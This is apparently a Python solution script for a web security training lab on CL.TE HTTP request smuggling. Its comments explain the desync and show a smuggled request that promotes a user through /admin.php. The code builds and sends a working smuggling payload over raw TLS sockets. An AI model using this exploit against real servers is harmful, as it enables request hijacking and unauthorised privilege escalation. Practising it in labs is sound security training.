import socket, ssl, requests
# from rich.console import Console
# from rich.syntax import Syntax
'''
    - CL.TE occurs when the frontend interprets a request using the Content-Length header and
      then sends it to a backend server that interprets the same request using the Transfer-Encoding header.
    - this can happen if the frontend server does not support Transfer Encoding

    
    - first send a request like this
    ---requestA---
    POST / HTTP/1.1
    Host: host.com
    Content-Length: 52
    Transfer-Encoding: chunked
    
    0

    POST /admin.php?promote_uid=2 HTTP/1.1
    Dummy: 
    ---/requestA---

    - then send a request like this
    ---requestB---
    POST / HTTP/1.1
    Host: host.com
    Content-Length: 52
    Transfer-Encoding: chunked
    
    0

    POST /admin.php?promote_uid=2 HTTP/1.1
    Dummy: 
    ---/requestB---
'''

host = '0ac700a00449980583908857002f0041.web-security-academy.net'
port = '443'

context = ssl.create_default_context()


# smugled request ---------------------------------------
second_req = '''GPOST / HTTP/1.1\r
Dummy: '''
len_second_req = len(second_req)
second_req = f'''{second_req}'''
# /smugled request ---------------------------------------


# main request ---------------------------------------
req = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Length: {len_second_req + 5}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
{second_req}'''
# /main request ---------------------------------------


# print request to terminal
print(f'-------------------------')
print(f'{req}')
print(f'-------------------------')
req = req.encode()
print(f'{req=}')


# send requestA / get response
print('sending requestA...')
with socket.create_connection((host, port)) as s:
    with context.wrap_socket(s, server_hostname=host) as secure_s:
        secure_s.sendall(req)
        resp = b''
        while True:
            data = secure_s.recv(4096)
            if not data: break
            resp += data

# print response
resp = resp.decode()
resp = resp.split('\r\n')
empty_index = resp.index('')
for i in range(empty_index+1):
    print(resp[i])


# send requestB and test response
# test_val is th expected response from the request (if request smuggling was not used)
# if this value is found, then the attack did not work
print('sending requestB...')
test_value = 'HTTP request smuggling, basic CL.TE vulnerability'
r = requests.get(f'https://{host}')
print(f'{r.status_code=}')
# print(f'{r.headers=}')
# print(f'{r.text=}')